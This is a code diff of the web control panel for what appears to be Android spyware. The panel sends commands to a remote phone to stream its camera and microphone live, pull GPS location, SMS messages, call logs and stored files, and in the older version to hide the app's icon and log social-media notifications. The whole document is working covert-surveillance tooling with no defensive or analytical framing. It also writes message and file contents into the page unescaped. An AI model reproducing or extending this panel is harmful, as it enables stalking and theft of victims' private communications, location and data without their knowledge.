@@ -1,131 +1,103 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Control Center v3</title>
+    <title>Monitor Console v4</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
         body { font-family: sans-serif; background: #121212; color: white; padding: 20px; }
-        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #333; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
-        .video-box { background: #000; width: 100%; height: 350px; display: flex; align-items: center; justify-content: center; overflow: hidden; border-radius: 8px; }
-        #live-frame { width: 100%; height: 100%; object-fit: contain; display: none; }
-        select, button { padding: 12px; margin: 5px; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; }
-        select { background: #333; color: white; width: 100%; }
+        .card { background: #1e1e1e; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #333; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
+        .video-box { background: #000; width: 100%; height: 350px; border-radius: 8px; overflow: hidden; display: flex; align-items: center; justify-content: center; position: relative; }
+        #live-frame { width: 100%; height: 100%; object-fit: contain; }
+        select, button { padding: 10px; margin: 5px; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; }
         .btn-green { background: #28a745; color: white; }
         .btn-red { background: #dc3545; color: white; }
-        .log-screen { background: black; color: #0f0; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; border: 1px solid #444; }
-        table { width: 100%; font-size: 12px; border-collapse: collapse; }
-        th, td { border-bottom: 1px solid #333; padding: 5px; text-align: left; }
+        .log-screen { background: black; color: #0f0; padding: 10px; height: 180px; overflow-y: auto; font-family: monospace; font-size: 12px; }
     </style>
 </head>
 <body>
 
-    <h2>📱 System Monitor Pro</h2>
-
     <div class="grid">
         <div class="card" style="grid-column: span 2;">
             <div class="video-box">
-                <img id="live-frame" src="">
-                <p id="placeholder">Feed Offline</p>
+                <img id="live-frame" style="display:none;">
+                <p id="placeholder">Stream Offline</p>
             </div>
-            
-            <div style="display: flex; gap: 10px; margin-top: 15px;">
-                <select id="cam-index">
-                    <option value="0">Back Camera</option>
-                    <option value="1">Front Camera</option>
-                </select>
-                <select id="stream-mode">
-                    <option value="video">Only Video</option>
-                    <option value="audio-video">Audio + Video</option>
-                    <option value="photo">Single Photo</option>
-                </select>
-                <button class="btn-green" onclick="executeStream()">START</button>
+            <div style="display:flex; gap:5px; margin-top:10px;">
+                <select id="cam-idx"><option value="0">Back Cam</option><option value="1">Front Cam</option></select>
+                <select id="mode-idx"><option value="video">Only Video</option><option value="audio-video">Audio+Video</option></select>
+                <button class="btn-green" onclick="startStream()">START</button>
                 <button class="btn-red" onclick="sendCmd('stop-stream')">STOP</button>
             </div>
         </div>
 
         <div class="card">
-            <h3>📊 Device Info</h3>
-            <p>Battery: <span id="batt">--</span>%</p>
-            <p>GPS: <span id="loc">Waiting...</span></p>
-            <button onclick="sendCmd('get-gps')">Update GPS</button>
-            <button onclick="sendCmd('hide-icon')" style="background:#444; color:white;">Hide Icon</button>
-            <button onclick="sendCmd('show-icon')" style="background:#444; color:white;">Show Icon</button>
+            <h3>📊 Status</h3>
+            <p>GPS: <span id="loc">None</span></p>
+            <button onclick="sendCmd('get-gps')">📍 Update GPS</button>
+            <button onclick="sendCmd('get-sms')">📩 Fetch SMS</button>
+            <button onclick="sendCmd('get-calls')">📞 Fetch Calls</button>
         </div>
 
         <div class="card">
-            <h3>📂 Data Extraction</h3>
-            <button onclick="sendCmd('get-sms')">Fetch SMS</button>
-            <button onclick="sendCmd('get-calls')">Fetch Calls</button>
-            <div id="data-log" class="log-screen">> System Ready...</div>
+            <h3>📁 File Manager</h3>
+            <button onclick="sendCmd('get-files')">Scan Storage</button>
+            <div id="file-list" class="log-screen" style="height: 120px; color: white;"></div>
+        </div>
+
+        <div class="card" style="grid-column: span 2;">
+            <h3>💬 Logs</h3>
+            <div id="data-log" class="log-screen"></div>
         </div>
     </div>
-<div class="card">
-    <h3>💬 Social Media Monitor</h3>
-    <div id="notif-log" class="log-screen" style="height: 250px;">
-        > Waiting for notifications...
-    </div>
-</div>
+
     <script>
         const socket = io();
+        function sendCmd(c) { socket.emit('phone-execute', c); }
 
-        function sendCmd(cmd) { socket.emit('phone-execute', cmd); }
-
-        function executeStream() {
-            const cam = document.getElementById('cam-index').value;
-            const mode = document.getElementById('stream-mode').value;
-            if (mode === 'photo') {
-                sendCmd(cam === "0" ? 'camera-back' : 'camera-front');
-            } else {
-                sendCmd(`stream:${cam}:${mode}`);
-            }
+        function startStream() {
+            const cam = document.getElementById('cam-idx').value;
+            const mode = document.getElementById('mode-idx').value;
+            sendCmd(`stream:${cam}:${mode}`);
         }
 
-        socket.on('battery-update', (d) => { document.getElementById('batt').innerText = d; });
-        
-        socket.on('location-update', (d) => {
-            document.getElementById('loc').innerHTML = `<a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank" style="color:#007bff">Map View</a>`;
-        });
-
-        socket.on('data-stream', (base64) => {
+        socket.on('data-stream', (b) => {
             document.getElementById('placeholder').style.display = 'none';
             const img = document.getElementById('live-frame');
             img.style.display = 'block';
-            img.src = "data:image/jpeg;base64," + base64;
+            img.src = "data:image/jpeg;base64," + b;
         });
 
-        socket.on('audio-stream', (base64) => {
-            const audio = new Audio("data:audio/wav;base64," + base64);
-            audio.play().catch(e => {});
+        socket.on('audio-stream', (b) => {
+            new Audio("data:audio/wav;base64," + b).play().catch(()=>{});
         });
 
-        socket.on('sms-data', (data) => {
-            const logs = JSON.parse(data);
-            let h = "<table><tr><th>From</th><th>SMS</th></tr>";
-            logs.forEach(m => h += `<tr><td>${m.from}</td><td>${m.body}</td></tr>`);
-            document.getElementById('data-log').innerHTML = h + "</table>";
+        socket.on('location-update', (d) => {
+            document.getElementById('loc').innerHTML = `<a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank">View Map</a>`;
         });
 
-        socket.on('call-data', (data) => {
-            const logs = JSON.parse(data);
-            let h = "<table><tr><th>Number</th></tr>";
-            logs.forEach(c => h += `<tr><td>${c.num}</td></tr>`);
-            document.getElementById('data-log').innerHTML = h + "</table>";
+        socket.on('file-data', (data) => {
+            const files = JSON.parse(data);
+            let h = "";
+            files.forEach(f => {
+                h += `<div>${f.d?'📁':'📄'} ${f.n} <button onclick="sendCmd('download:${f.n}')" style="padding:2px; font-size:10px;">DL</button></div>`;
+            });
+            document.getElementById('file-list').innerHTML = h;
         });
-        socket.on('notif-data', (data) => {
-        const log = document.getElementById('notif-log');
-        const time = new Date().toLocaleTimeString();
-        
-        // Format: [WhatsApp] John: Hello there!
-        const entry = `<p style="margin:5px 0; border-bottom:1px solid #222;">
-            <span style="color:#28a745;">[${data.app.split('.').pop()}]</span> 
-            <strong>${data.title}:</strong> ${data.message} 
-            <small style="color:#666; float:right;">${time}</small>
-        </p>`;
-        
-        log.innerHTML = entry + log.innerHTML;
-    });
+
+        socket.on('sms-data', (d) => {
+            const logs = JSON.parse(d);
+            let h = "<b>SMS:</b><br>";
+            logs.forEach(m => h += `[${m.from}] ${m.body}<br>`);
+            document.getElementById('data-log').innerHTML = h;
+        });
+
+        socket.on('file-download-ready', (f) => {
+            const a = document.createElement('a');
+            a.href = "data:application/octet-stream;base64," + f.data;
+            a.download = f.name;
+            a.click();
+        });
     </script>
 </body>
 </html>
-
